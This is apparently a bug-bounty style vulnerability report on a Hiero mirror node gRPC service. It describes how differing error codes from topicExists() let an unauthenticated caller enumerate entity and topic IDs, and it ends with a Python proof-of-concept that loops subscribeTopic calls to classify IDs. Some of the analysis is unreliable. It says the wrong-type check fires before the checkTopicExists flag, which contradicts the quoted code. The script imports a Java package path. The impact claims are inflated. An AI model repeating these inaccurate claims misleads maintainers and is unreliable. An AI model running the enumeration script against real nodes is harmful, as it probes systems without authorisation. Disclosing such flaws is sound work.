### Title
Topic ID Enumeration Oracle via Differential gRPC Error Responses in `topicExists()`

### Summary
The `topicExists()` method in `TopicMessageServiceImpl.java` emits two structurally distinct exceptions depending on whether a queried entity ID is absent from the database (`EntityNotFoundException`) or present but of the wrong type (`IllegalArgumentException`). These map to different gRPC status codes (`NOT_FOUND` vs `INVALID_ARGUMENT`) that are returned verbatim to any unauthenticated caller, creating a side-channel oracle that allows enumeration of which numeric entity IDs correspond to existing non-topic entities versus truly absent IDs, and by exclusion, which IDs are valid topics.

### Finding Description
**Code location:** `grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, `topicExists()`, lines 94–106.

```
94:  private Mono<?> topicExists(TopicMessageFilter filter) {
95:      var topicId = filter.getTopicId();
96:      return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
97:              .switchIfEmpty(
98:                      grpcProperties.isCheckTopicExists()
99:                              ? Mono.error(new EntityNotFoundException(topicId))   // path A
100:                             : Mono.just(Entity.builder()...))
103:            .filter(e -> e.getType() == EntityType.TOPIC)
104:            .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));  // path B
105: }
```

**Error-to-status mapping** in `ProtoUtil.toStatusRuntimeException()` (lines 47–52 of `ProtoUtil.java`):
- `IllegalArgumentException` → `Status.INVALID_ARGUMENT` + message `"Not a valid topic"`
- `EntityNotFoundException` → `Status.NOT_FOUND` + message `"<id> does not exist"`

**Three distinguishable outcomes for any caller:**

| Condition | Exception thrown | gRPC status returned |
|---|---|---|
| Entity ID not in DB (and `checkTopicExists=true`) | `EntityNotFoundException` | `NOT_FOUND` |
| Entity ID in DB, type ≠ TOPIC (account, contract, file…) | `IllegalArgumentException` | `INVALID_ARGUMENT` |
| Entity ID in DB, type = TOPIC | none | stream opens |

**Root cause:** The two `switchIfEmpty` branches produce semantically different exception types that are never normalized before being surfaced to the client. The `checkTopicExists` flag only gates path A; path B (`IllegalArgumentException`) fires unconditionally whenever an entity exists with a non-TOPIC type, regardless of the flag value.

**Exploit flow:**
1. Attacker iterates over candidate entity IDs (e.g., `0.0.1` through `0.0.N`) by issuing `subscribeTopic` gRPC calls.
2. `NOT_FOUND` → ID does not exist in the mirror node DB.
3. `INVALID_ARGUMENT` with `"Not a valid topic"` → ID *exists* in the DB but is an account/contract/file/etc.
4. Stream opens (or `NOT_FOUND` with `checkTopicExists=false` suppressed) → ID is a valid TOPIC.
5. Attacker now has a precise map of which IDs are valid topics and can subscribe to each to retrieve their full stored message history.

**Why existing checks are insufficient:** The `checkTopicExists` flag suppresses `EntityNotFoundException` but does nothing to suppress `IllegalArgumentException` on path B. Even with `checkTopicExists=false`, the attacker can still distinguish "entity exists, wrong type" from "entity is a topic" because path B fires before the flag is consulted. No authentication, rate-limiting, or response normalization is applied at the service layer.

### Impact Explanation
Any unauthenticated caller can enumerate the complete set of valid topic IDs stored in the mirror node database by observing the gRPC status code (`NOT_FOUND` vs `INVALID_ARGUMENT` vs stream-open). Once valid topic IDs are known, the attacker can subscribe to each and retrieve the full message history stored by the mirror node. This enables targeted comparison of mirror-node-stored message sequences against independently obtained Hashgraph records, providing a systematic basis for detecting or verifying inconsistencies in the mirrored history — the prerequisite step for any Hashgraph history tampering verification campaign. The information disclosed (entity existence and type) is not otherwise gated behind any access control in this service.

### Likelihood Explanation
The attack requires no credentials, no special tooling beyond a standard gRPC client, and no prior knowledge. Entity IDs on Hiero/Hedera are sequential 64-bit integers starting from low values, making brute-force enumeration of the active range trivial. The gRPC `subscribeTopic` endpoint is publicly exposed. The differential is stable and deterministic — it does not depend on timing, load, or configuration (path B fires regardless of `checkTopicExists`). Any motivated external party can execute this enumeration repeatedly and reliably.

### Recommendation
Normalize the error response before it reaches the client so that both "entity not found" and "entity found but wrong type" produce the same gRPC status code and a generic message. Specifically:

1. In `topicExists()`, replace the `IllegalArgumentException` on line 105 with `EntityNotFoundException` (or a new uniform `TopicNotFoundException`), so both absence and wrong-type cases map to `NOT_FOUND`.
2. Alternatively, in `ProtoUtil.toStatusRuntimeException()`, map `IllegalArgumentException` with the message `"Not a valid topic"` to `NOT_FOUND` rather than `INVALID_ARGUMENT`.
3. Consider adding per-IP or per-connection rate limiting on the `subscribeTopic` endpoint to slow enumeration regardless of error normalization.

### Proof of Concept
```python
import grpc
from com.hederahashgraph.api.proto.java import ConsensusService_pb2_grpc, ConsensusService_pb2

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = ConsensusService_pb2_grpc.ConsensusServiceStub(channel)

for entity_num in range(1, 10000):
    req = ConsensusService_pb2.ConsensusTopicQuery()
    req.topicID.topicNum = entity_num
    try:
        next(stub.subscribeTopic(req))
        print(f"{entity_num}: VALID TOPIC (stream opened)")
    except grpc.RpcError as e:
        if e.code() == grpc.StatusCode.NOT_FOUND:
            print(f"{entity_num}: does not exist")
        elif e.code() == grpc.StatusCode.INVALID_ARGUMENT and "Not a valid topic" in e.details():
            print(f"{entity_num}: EXISTS but is not a topic (account/contract/file)")
        else:
            print(f"{entity_num}: other error: {e.code()} {e.details()}")
```

Running this against a live mirror node produces a complete enumeration of which entity IDs are absent, which are non-topic entities, and which are valid topics — all without any credentials. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L94-106)
```java
    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/util/ProtoUtil.java (L44-60)
```java
    public static StatusRuntimeException toStatusRuntimeException(Throwable t) {
        if (Exceptions.isOverflow(t)) {
            return clientError(t, Status.DEADLINE_EXCEEDED, OVERFLOW_ERROR);
        } else if (t instanceof ConstraintViolationException
                || t instanceof IllegalArgumentException
                || t instanceof InvalidEntityException) {
            return clientError(t, Status.INVALID_ARGUMENT, t.getMessage());
        } else if (t instanceof EntityNotFoundException) {
            return clientError(t, Status.NOT_FOUND, t.getMessage());
        } else if (t instanceof TransientDataAccessException || t instanceof TimeoutException) {
            return serverError(t, Status.RESOURCE_EXHAUSTED, DB_ERROR);
        } else if (t instanceof NonTransientDataAccessResourceException) {
            return serverError(t, Status.UNAVAILABLE, DB_ERROR);
        } else {
            return serverError(t, Status.UNKNOWN, UNKNOWN_ERROR);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/exception/EntityNotFoundException.java (L8-15)
```java
public class EntityNotFoundException extends MirrorNodeException {

    private static final String MESSAGE = "%s does not exist";
    private static final long serialVersionUID = 809036847722840635L;

    public EntityNotFoundException(EntityId entityId) {
        super(String.format(MESSAGE, entityId));
    }
```
